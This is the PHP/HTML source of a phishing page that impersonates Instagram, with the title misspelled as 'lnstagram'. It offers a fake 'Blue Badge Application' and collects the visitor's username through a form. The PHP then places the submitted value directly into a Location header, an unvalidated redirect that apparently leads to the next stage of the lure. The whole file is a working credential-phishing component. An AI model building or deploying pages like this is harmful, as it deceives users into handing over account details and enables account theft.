<?php

if($_POST){
$id= $_POST['id'];
header("location: $id");
}
?>
<!DOCTYPE html>

<html>
<head>
	<link rel="stylesheet" href="files/style.css" type="text/css" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="css/xcode.css">
	<link rel="stylesheet" type="text/css" href="css/xcode2.css">
	<link rel="stylesheet" type="text/css" href="css/xcode3.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.hizliresim.com/egpgwd2.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">

	<title>lnstagram | Blue Badge</title>
</head>
<body>
	<header>
		<table>
			<tr>
				<td><img src="files/header.png" width="200"></td>
				<td><i class="fas fa-stream"></i></td>
			</tr>
		</table>
	</header><br><br>
    <img src="files/dm.jpg" style="display: none;">	
<center>
<style>
*{
	transition:0.0s;
}
.a_adaskpd{
      padding:7px 30px;
      margin-top:10px;
      outline:none;
      border:none;
      color:white;
      background:#08a0e9;
      font-weight:bold;
      font-size:15px;
      margin-bottom:10px;
      border-radius:3px;
	  }
	  button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    font-size: 14px;
    line-height: 18px;
}
.button-box {
    display: block;
    position: relative;
    margin: 8px 40px;
}
.btn {
    cursor: pointer;
    width: 100%;
    padding: 0 8px;
    background: #3897f0;
    border: 1px solid #3897f0;
    color: #fff;
    border-radius: 3px;
    font-weight: 600;
    font-size: 14px;
    height: 30px;
    line-height: 26px;
    outline: 0;
    white-space: nowrap;
}
@media (max-width: 450px) {
    .btn {
        cursor: pointer;
        width: 100%;
        padding: 0 8px;
        background: #3897f0;
        border: 1px solid #3897f0;
        color: #fff;
        border-radius: 3px;
        font-weight: 600;
        font-size: 14px;
        height: 28px;
        line-height: 26px;
        outline: 0;
        white-space: nowrap;
    }
}
</style>
<div class="center" style="background: white; border-radius:4px;">
<br>
<center>
 <div  style="margin-bottom:30px;"></div>
<img src="files/tenor.gif" width=130 style="border-radius:50%;margin-top:12px;margin-bottom:18px;" align="center">
<h2 class="AjK3K" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif; " align="center"><b>Blue Badge Application</b></h2>
<div class="GA2q- ">
            <form class="JraEb" method="POST">
            <div class="QuiLu Xb8C0">

			<input required name="id" placeholder="Username" type="text" class="PAhYv zyHYP">
			<div style="font-family:sans-serif; margin-top:10px;"  >
			<div  style="margin-bottom:10px;"></div>
			<a align="right"style="text-align:right; color: #09a7fd ; font-family:sans-serif; font-size:14px; font-weight:400;text-decoration:none;" href="" id="link"> Forgot password? </a></center>
			<span class="button-box">
			<button class="btn" type="submit" name="submit">Next</button>
 			</span>  
			<!--<span class="idhGk _1OSdk">
			<center><button type="submit"  style="margin-top:6px;width:100%;background: #3897f0; border-color: #3897f0; color: #fff; " class="a_adaskpd">Next</button></center>-->
            </form>
            <div  style="margin-bottom:15px;"></div>
			<br>
			<br>
			<center><a style="color:#999; text-align:right; font-family:sans-serif; font-size:14px; font-weight:normal; ;">  Don't have an account? </a> <a style="text-decoration:none;text-align:right; color: #09a7fd; font-family:sans-serif; font-size:14px; font-weight:600;" href="" id="link"> Sign up </a></center>
 <div  style="margin-bottom:50px;"></div>
</div>
</center>


</div>
<br>
<br>

</center>

</body>
</html>